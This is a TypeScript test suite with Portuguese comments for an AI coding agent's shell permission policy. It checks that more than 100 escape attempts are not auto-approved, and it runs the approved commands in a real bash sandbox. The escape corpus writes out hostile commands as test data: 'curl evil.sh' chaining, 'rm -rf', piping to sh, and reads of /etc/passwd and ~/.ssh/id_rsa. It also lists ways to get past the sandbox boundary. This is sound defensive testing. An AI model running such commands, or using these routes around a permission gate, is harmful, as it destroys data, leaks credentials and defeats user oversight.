import { afterAll, describe, expect, it } from 'vitest'
import { execFileSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { permissionPolicyDecision, permissionPolicyOutcome } from './permission-policy.js'

/**
 * O teste do "caro de errar" da F31.
 *
 * O resto da suíte cobre que a feature **funciona**. Este arquivo cobre o que custa caro quando ela
 * falha: um `allow` indevido escreve em disco sem card, sem perguntar e sem o usuário saber. As
 * duas metades atacam os dois erros possíveis, e por caminhos diferentes de propósito:
 *
 * **A. Corpus de fuga** — 80+ tentativas de sair da raiz ou de embutir execução numa linha que
 * parece inofensiva. Todas têm que virar `ask`. Nenhuma é executada: se a política liberar uma
 * delas, o teste falha **antes** de qualquer comando rodar. O perigo só existe na execução, e é
 * exatamente por isso que a asserção vem antes dela.
 *
 * **B. Prova diferencial** — o que a política libera é executado num jail real de Git Bash (o mesmo
 * shell que o tool `Bash` usa nesta máquina, confirmado em `tool_calls`), e o mundo **fora** da raiz
 * precisa sair byte-idêntico. Esta metade existe porque a metade A só compara o classificador com a
 * minha leitura do shell; aqui ele é comparado com o shell de verdade. Se o bash entender um
 * argumento de forma diferente da que o parser entendeu, a diferença aparece como arquivo mexido
 * onde não devia — que é justamente o dano que a feature promete não causar.
 */

// ── Git Bash: sem ele a metade B não tem o que provar ────────────────────────
const bashAvailable = (() => {
  try {
    execFileSync('bash', ['-c', 'exit 0'], { timeout: 10_000, windowsHide: true })
    return true
  } catch {
    return false
  }
})()

const fixtures: string[] = []

afterAll(() => {
  for (const dir of fixtures) rmSync(dir, { recursive: true, force: true })
})

/**
 * Link de diretório que aponta para fora da raiz.
 *
 * `symlink` no Windows exige privilégio (EPERM sem Developer Mode), e a primeira versão deste
 * arquivo engolia essa falha — os três casos de symlink passavam **porque o link não existia**,
 * ou seja, o teste afirmava proteger algo que nunca foi exercitado. `junction` não precisa de
 * privilégio, `realpathSync` a resolve igual, e é isso que torna o caso real aqui.
 */
function linkOutOfRoot(target: string, link: string): boolean {
  for (const type of ['junction', 'dir'] as const) {
    try {
      symlinkSync(target, link, type)
      return true
    } catch {
      // tenta o próximo tipo
    }
  }
  return false
}

/** `base/projeto` é a raiz; `base/fora` é o que nunca pode ser tocado. */
function makeWorld(withSymlink = false): { base: string; root: string } {
  const base = mkdtempSync(path.join(tmpdir(), 'engrenacode_f31_escape_'))
  fixtures.push(base)
  const root = path.join(base, 'projeto')

  mkdirSync(path.join(root, 'src'), { recursive: true })
  mkdirSync(path.join(root, 'dir'), { recursive: true })
  mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true })
  writeFileSync(path.join(root, 'origem.txt'), 'alfa\n')
  writeFileSync(path.join(root, 'texto.txt'), 'alfa\n')
  writeFileSync(path.join(root, 'dir', 'interno.txt'), 'dentro\n')
  writeFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n')

  mkdirSync(path.join(base, 'fora'), { recursive: true })
  writeFileSync(path.join(base, 'fora', 'canario.txt'), 'nao pode mudar\n')
  writeFileSync(path.join(base, 'canario-irmao.txt'), 'nao pode mudar\n')

  if (withSymlink) linkOutOfRoot(path.join(base, 'fora'), path.join(root, 'atalho'))
  return { base, root }
}

/** Caminho POSIX: é assim que o agente escreve, e é o que o Git Bash aceita no Windows. */
function posix(p: string): string {
  return p.replace(/\\/g, '/')
}

function decide(root: string, command: string): string {
  return permissionPolicyDecision('auto-accept-edits', 'Bash', { params: { command }, root })
}

// ── A. Corpus de fuga ────────────────────────────────────────────────────────

describe('F31 — corpus de fuga: nada aqui pode ser auto-aprovado', () => {
  const { base, root } = makeWorld(true)
  const rootPosix = posix(root)
  const foraPosix = posix(path.join(base, 'fora'))
  // Se o link não existir, `atalho/x` é só um caminho comum dentro da raiz e liberá-lo está certo:
  // o caso deixa de ser uma fuga. Pular explicitamente é honesto; passar em silêncio, não.
  const linkOk = existsSync(path.join(root, 'atalho'))

  /**
   * Cada entrada é uma tentativa de conseguir `allow` para algo que escreve fora da raiz, executa
   * código, ou depende de expansão que só o shell sabe fazer.
   */
  const escapes: readonly [categoria: string, comando: string][] = [
    // Travessia de caminho
    ['traversal', 'touch ../vazado.txt'],
    ['traversal', 'mkdir ../../vazado'],
    ['traversal', 'cp origem.txt ../vazado.txt'],
    ['traversal', 'cp origem.txt src/../../vazado.txt'],
    ['traversal', 'mv origem.txt ../vazado.txt'],
    ['traversal', 'sed -i s/a/b/ ../vazado.txt'],
    ['traversal', `touch ${foraPosix}/vazado.txt`],
    ['traversal', `cp origem.txt ${foraPosix}/vazado.txt`],
    ['traversal', 'touch /tmp/vazado.txt'],
    ['traversal', 'mkdir /etc/vazado'],
    ['traversal', 'touch C:/Windows/Temp/vazado.txt'],

    // Symlink que sai da raiz
    ['symlink', 'touch atalho/vazado.txt'],
    ['symlink', 'cp origem.txt atalho/vazado.txt'],
    ['symlink', 'sed -i s/a/b/ atalho/canario.txt'],

    // Caminho protegido
    ['git', 'cp origem.txt .git/hooks/pre-commit'],
    ['git', 'touch .git/hooks/post-checkout'],
    ['git', 'mv origem.txt .git/config'],
    ['git', 'sed -i s/a/b/ .git/hooks/pre-commit'],
    ['git', 'mkdir .git/objects/xx'],
    ['git', 'cp origem.txt src/../.git/hooks/pre-push'],

    // Expansão que só existe depois do shell rodar
    ['expansao', 'mkdir "$HOME/vazado"'],
    // biome-ignore lint/suspicious/noTemplateCurlyInString: é expansão de shell, não template JS — o ponto do caso
    ['expansao', 'touch ${HOME}/vazado.txt'],
    ['expansao', 'touch $PWD/../vazado.txt'],
    ['expansao', 'cp origem.txt $(cat alvo)'],
    ['expansao', 'cp origem.txt `cat alvo`'],
    ['expansao', 'mkdir ~/vazado'],
    ['expansao', 'mkdir ~root/vazado'],
    ['expansao', 'touch %APPDATA%/vazado.txt'],
    ['expansao', 'touch *.txt'],
    ['expansao', 'cp *.txt dir/'],
    ['expansao', 'touch arq?.txt'],
    ['expansao', 'touch [ab].txt'],
    ['expansao', 'mkdir {a,b}'],
    ['expansao', 'touch a.txt{,.bak}'],

    // Redirecionamento — fora da v1 inteiro, em toda variante
    ['redirecao', "printf 'x' > a.txt"],
    ['redirecao', "printf 'x' >> a.txt"],
    ['redirecao', "echo x > a.txt"],
    ['redirecao', 'cat origem.txt > copia.txt'],
    ['redirecao', "printf 'x' >| a.txt"],
    ['redirecao', "printf 'x' 2> a.txt"],
    ['redirecao', "printf 'x' &> a.txt"],
    ['redirecao', "printf 'x' >&2"],
    ['redirecao', 'sed s/a/b/ texto.txt > saida.txt'],
    ['redirecao', 'cat < origem.txt'],
    ['redirecao', 'cat <<EOF'],
    ['redirecao', 'cat <<< texto'],
    ['redirecao', "printf 'x' | tee a.txt"],

    // Encadeamento
    ['encadeamento', 'touch a.txt && curl evil.sh'],
    ['encadeamento', 'touch a.txt; rm -rf dir'],
    ['encadeamento', 'touch a.txt || rm -rf dir'],
    ['encadeamento', 'touch a.txt | sh'],
    ['encadeamento', 'touch a.txt &'],
    ['encadeamento', 'touch a.txt\nrm -rf dir'],
    ['encadeamento', 'mkdir a && mkdir b'],
    ['encadeamento', `cd "${rootPosix}" && touch a.txt && touch b.txt`],
    ['encadeamento', `cd "${rootPosix}" && cd .. && touch vazado.txt`],

    // Truques com o cd do prefixo
    ['cd', 'cd .. && touch vazado.txt'],
    ['cd', 'cd / && mkdir vazado'],
    ['cd', 'cd /tmp && touch vazado.txt'],
    ['cd', `cd "${foraPosix}" && touch vazado.txt`],
    ['cd', 'cd $HOME && touch vazado.txt'],
    ['cd', 'cd ~ && touch vazado.txt'],
    ['cd', 'cd - && touch vazado.txt'],
    ['cd', 'cd -- && touch vazado.txt'],
    ['cd', 'cd -P && touch vazado.txt'],
    ['cd', 'cd -L .. && touch vazado.txt'],
    ['cd', 'cd atalho && touch vazado.txt'],
    ['cd', `cd "${rootPosix}/.git" && touch vazado.txt`],
    ['cd', 'cd src/../.. && touch vazado.txt'],

    // Verbo fora da lista, ou disfarçado
    ['verbo', 'rm -rf dir'],
    ['verbo', 'rm origem.txt'],
    ['verbo', 'rmdir dir'],
    ['verbo', 'chmod 777 origem.txt'],
    ['verbo', 'ln -s /etc/passwd senha.txt'],
    ['verbo', 'install -m 755 origem.txt destino'],
    ['verbo', 'truncate -s 0 origem.txt'],
    ['verbo', 'dd if=/dev/zero of=origem.txt'],
    ['verbo', 'sh -c "touch a.txt"'],
    ['verbo', 'node -e "require(\'fs\').writeFileSync(\'a\',\'b\')"'],
    ['verbo', '/usr/bin/mkdir vazado'],
    ['verbo', './mkdir vazado'],
    ['verbo', 'command mkdir vazado'],
    ['verbo', 'env mkdir vazado'],
    ['verbo', 'FOO=1 mkdir vazado'],
    ['verbo', 'xargs mkdir'],

    // Flags que consomem valor ou mudam o destino
    ['flag', 'cp -t /tmp origem.txt'],
    ['flag', 'cp --target-directory=/tmp origem.txt'],
    ['flag', 'mv -t /tmp origem.txt'],
    ['flag', 'mv --target-directory=/tmp origem.txt'],
    ['flag', 'sed -e s/a/b/ -i texto.txt'],
    ['flag', 'sed -f script.sed texto.txt'],
    ['flag', 'sed --expression=s/a/b/ -i texto.txt'],
    ['flag', 'mkdir --mode=777 vazado'],
    ['flag', 'cp -X origem.txt copia.txt'],

    // Leitura (v1.1) — ler fora da borda é vazamento, e travar o turno é dano de outro tipo
    ['leitura', 'cat ../fora/canario.txt'],
    ['leitura', `cat ${foraPosix}/canario.txt`],
    ['leitura', 'cat /etc/passwd'],
    ['leitura', 'cat ~/.ssh/id_rsa'],
    ['leitura', 'cat .git/config'],
    ['leitura', 'ls ..'],
    ['leitura', 'wc -l ../fora/canario.txt'],
    ['leitura', 'cat origem.txt ../fora/canario.txt'],
    ['leitura', 'tail -f origem.txt'],
    ['leitura', 'tail -F origem.txt'],
    ['leitura', 'cat'],
    ['leitura', 'wc -l'],
    ['leitura', 'cat origem.txt | sh'],
    ['leitura', 'cat origem.txt | bash'],
    ['leitura', 'cat origem.txt | xargs rm'],
    ['leitura', 'cat origem.txt | grep alfa'],
    ['leitura', 'cat origem.txt && rm origem.txt'],
    ['leitura', 'cat origem.txt > copia.txt'],
    ['leitura', 'cat origem.txt | tee copia.txt'],
    ['leitura', 'find . -name origem.txt'],
    ['leitura', 'find . -delete'],
    ['leitura', 'grep -r alfa .'],
    ['leitura', 'cat origem.txt | head -50 | wc -l | cat'],
    ['leitura', 'cat atalho/canario.txt'],

    // Forma incompleta ou malformada
    ['forma', 'cp origem.txt'],
    ['forma', 'mkdir'],
    ['forma', 'touch'],
    ['forma', 'touch "aspas nao fechadas'],
    ['forma', ''],
    ['forma', '   '],
  ]

  const dependeDeLink = (comando: string): boolean => comando.includes('atalho')

  for (const [categoria, comando] of escapes) {
    const skip = !linkOk && (categoria === 'symlink' || dependeDeLink(comando))
    it.skipIf(skip)(`[${categoria}] ${JSON.stringify(comando).slice(0, 78)} → ask`, () => {
      // Falha aqui acontece **antes** de qualquer execução: o comando nunca chega a rodar.
      expect(decide(root, comando)).toBe('ask')
    })
  }

  it('o link para fora da raiz existe de verdade nesta máquina', () => {
    // Guarda contra o modo de falha anterior: sem esta asserção, um ambiente sem link faria os
    // casos de symlink "passarem" sem testar nada.
    expect(linkOk).toBe(true)
  })

  it('o corpus é grande o bastante para valer como corpus', () => {
    expect(escapes.length).toBeGreaterThanOrEqual(120)
  })

  it('nenhum caminho fora da raiz sobreviveu à decisão — invariante, não caso a caso', () => {
    // Reafirma o contrato de uma vez só: em nenhuma das tentativas a política produziu motivo
    // `shell-file-edit`, que é o único que libera shell.
    for (const [categoria, comando] of escapes) {
      if (!linkOk && (categoria === 'symlink' || dependeDeLink(comando))) continue
      const outcome = permissionPolicyOutcome('auto-accept-edits', 'Bash', {
        params: { command: comando },
        root,
      })
      expect(outcome.reason.kind).not.toBe('shell-file-edit')
    }
  })
})

// ── B. Prova diferencial contra o shell de verdade ───────────────────────────

type Snapshot = Map<string, string>

/** Conteúdo por caminho relativo. `lstat` para não seguir symlink e sair da árvore. */
function snapshot(base: string): Snapshot {
  const seen: Snapshot = new Map()
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name)
      const rel = path.relative(base, full)
      const stat = lstatSync(full)
      if (stat.isSymbolicLink()) {
        seen.set(rel, 'symlink')
        continue
      }
      if (stat.isDirectory()) {
        seen.set(rel, 'dir')
        walk(full)
        continue
      }
      seen.set(rel, createHash('sha256').update(readFileSync(full)).digest('hex'))
    }
  }
  walk(base)
  return seen
}

function changedPaths(before: Snapshot, after: Snapshot): string[] {
  const changed = new Set<string>()
  for (const [rel, hash] of after) if (before.get(rel) !== hash) changed.add(rel)
  for (const rel of before.keys()) if (!after.has(rel)) changed.add(rel)
  return [...changed].sort()
}

describe.skipIf(!bashAvailable)('F31 — o que a política libera, executado de verdade', () => {
  /**
   * Comandos escritos à mão, todos benignos por construção — a metade A é quem cobre o hostil, e
   * ela nunca executa nada. O que se prova aqui é outra coisa: que a leitura de caminhos do parser
   * bate com a do bash. Um `cp -r`, um `sed -i` que cria backup, um argumento com espaço ou com
   * `;` dentro de aspas: em todos, o conjunto de arquivos que o shell mexe tem que caber dentro da
   * raiz que a política julgou.
   */
  const allowed: readonly [rotulo: string, comando: (root: string) => string][] = [
    ['mkdir simples', () => 'mkdir novo'],
    ['mkdir -p aninhado', () => 'mkdir -p a/b/c'],
    ['touch novo', () => 'touch arq.txt'],
    ['touch múltiplo', () => 'touch a.txt b.txt'],
    ['touch com espaço no nome', () => 'touch "com espaco.txt"'],
    // Aspas seguram o `;`: o bash cria UM arquivo com esse nome, não executa `rm`. Se o nosso
    // parser discordasse disso, o diff de arquivos denunciaria.
    ['touch com ; dentro de aspas', () => 'touch "estranho; rm -rf dir"'],
    ['cp arquivo', () => 'cp origem.txt copia.txt'],
    ['cp -r diretório', () => 'cp -r dir dir2'],
    ['cp por caminho relativo com ..', () => 'cp src/../origem.txt copia2.txt'],
    ['mv arquivo', () => 'mv origem.txt movido.txt'],
    ['mv para subdiretório', () => 'mv texto.txt dir/texto.txt'],
    ['sed -i in-place', () => 'sed -i s/alfa/beta/ texto.txt'],
    ['sed -i com backup', () => 'sed -i.bak s/alfa/beta/ texto.txt'],
    ['cd da raiz + touch', (root) => `cd "${posix(root)}" && touch dentro.txt`],
    // Sobe do `src` para a raiz e continua dentro do projeto: a borda é o projeto, não o cwd.
    ['cd de subdiretório + cp que sobe', (root) => `cd "${posix(root)}/src" && cp ../origem.txt copiado.txt`],
    ['cd de subdiretório + mkdir', (root) => `cd "${posix(root)}/dir" && mkdir -p x/y`],
  ]

  for (const [rotulo, build] of allowed) {
    it(`${rotulo}: roda e não toca em nada fora da raiz`, () => {
      const { base, root } = makeWorld()
      const command = build(root)

      // Pré-condição: só executamos o que a política liberaria sem card.
      expect(decide(root, command)).toBe('allow')

      const before = snapshot(base)
      execFileSync('bash', ['-c', command], { cwd: root, timeout: 15_000, windowsHide: true })
      const after = snapshot(base)

      const changed = changedPaths(before, after)
      // O comando tem que ter feito alguma coisa — teste que não observa efeito não prova nada.
      expect(changed.length).toBeGreaterThan(0)

      // A promessa da feature, verificada contra o disco: tudo que mudou está sob `projeto/`.
      const foraDaRaiz = changed.filter((rel) => rel !== 'projeto' && !rel.startsWith(`projeto${path.sep}`))
      expect(foraDaRaiz).toEqual([])
    }, 30_000)
  }

  it('o canário fora da raiz continua intacto depois de toda a bateria', () => {
    const { base, root } = makeWorld()
    const canario = path.join(base, 'fora', 'canario.txt')
    const antes = readFileSync(canario, 'utf8')

    for (const [, build] of allowed) {
      const command = build(root)
      if (decide(root, command) !== 'allow') continue
      try {
        execFileSync('bash', ['-c', command], { cwd: root, timeout: 15_000, windowsHide: true })
      } catch {
        // Comando que falha (arquivo já movido pela iteração anterior) não invalida o canário.
      }
    }

    expect(readFileSync(canario, 'utf8')).toBe(antes)
    expect(readFileSync(path.join(base, 'canario-irmao.txt'), 'utf8')).toBe('nao pode mudar\n')
    // `.git` é protegido: nada da bateria pode ter encostado no hook.
    expect(readFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), 'utf8')).toBe('#!/bin/sh\nexit 0\n')
  }, 60_000)

  it('o jail é real: um comando de controle fora da lista alcançaria o canário', () => {
    // Sem este teste, os anteriores passariam mesmo se `bash` não estivesse executando nada. Aqui a
    // fuga é executada de propósito para provar que o jail detecta — e ela é justamente uma das que
    // a política recusa (`printf > ../`), o que fecha o argumento: a recusa é o que segura o dano.
    const { base, root } = makeWorld()
    const fuga = 'printf x > ../fora/canario.txt'
    expect(decide(root, fuga)).toBe('ask')

    const before = snapshot(base)
    execFileSync('bash', ['-c', fuga], { cwd: root, timeout: 15_000, windowsHide: true })
    const changed = changedPaths(before, snapshot(base))

    expect(changed).toContain(path.join('fora', 'canario.txt'))
  }, 30_000)
})

describe.skipIf(!bashAvailable)('F31 v1.1 — leitura liberada não muda nada no disco', () => {
  /**
   * Para leitura o invariante é mais forte que "nada fora da borda": é **nada em lugar nenhum**.
   * Um comando de leitura que altere qualquer arquivo, dentro ou fora da raiz, foi classificado
   * errado — e é isso que este bloco cobra contra o bash de verdade, não contra a minha leitura dele.
   */
  const leituras: readonly [rotulo: string, comando: (root: string) => string][] = [
    // O comando exato que a medição de 2026-08-19 viu ficar dois minutos preso no card.
    ['o caso medido: cat -A | head', () => 'cat -A texto.txt | head -50'],
    ['cat simples', () => 'cat origem.txt'],
    ['cat de vários arquivos', () => 'cat origem.txt texto.txt'],
    ['ls sem argumento', () => 'ls'],
    ['ls -la de subdiretório', () => 'ls -la dir'],
    ['ls -R recursivo', () => 'ls -R'],
    ['wc -l', () => 'wc -l origem.txt'],
    ['head -n com valor separado', () => 'head -n 2 origem.txt'],
    ['tail sem follow', () => 'tail -5 origem.txt'],
    ['pipeline de três estágios', () => 'cat origem.txt | head -10 | wc -l'],
    ['cd + ls', (root) => `cd "${posix(root)}/src" && ls -la`],
    ['cd + cat por caminho que sobe', (root) => `cd "${posix(root)}/src" && cat ../origem.txt`],
  ]

  for (const [rotulo, build] of leituras) {
    it(`${rotulo}: roda e o disco sai idêntico`, () => {
      const { base, root } = makeWorld()
      const command = build(root)

      expect(decide(root, command)).toBe('allow')

      const before = snapshot(base)
      execFileSync('bash', ['-c', command], { cwd: root, timeout: 15_000, windowsHide: true })

      // Nem dentro, nem fora: leitura não escreve.
      expect(changedPaths(before, snapshot(base))).toEqual([])
    }, 30_000)
  }

  it('o comando que a v1.1 recusa por travar o turno realmente travaria', () => {
    // Prova que `tail -f` fora da lista não é excesso de zelo: com timeout de 3 s o processo é
    // morto sem ter terminado, que é exatamente o turno preso que a lista evita.
    const { root } = makeWorld()
    expect(decide(root, 'tail -f origem.txt')).toBe('ask')
    let travou = false
    try {
      execFileSync('bash', ['-c', 'tail -f origem.txt'], { cwd: root, timeout: 3_000, windowsHide: true })
    } catch {
      travou = true
    }
    expect(travou).toBe(true)
  }, 30_000)
})
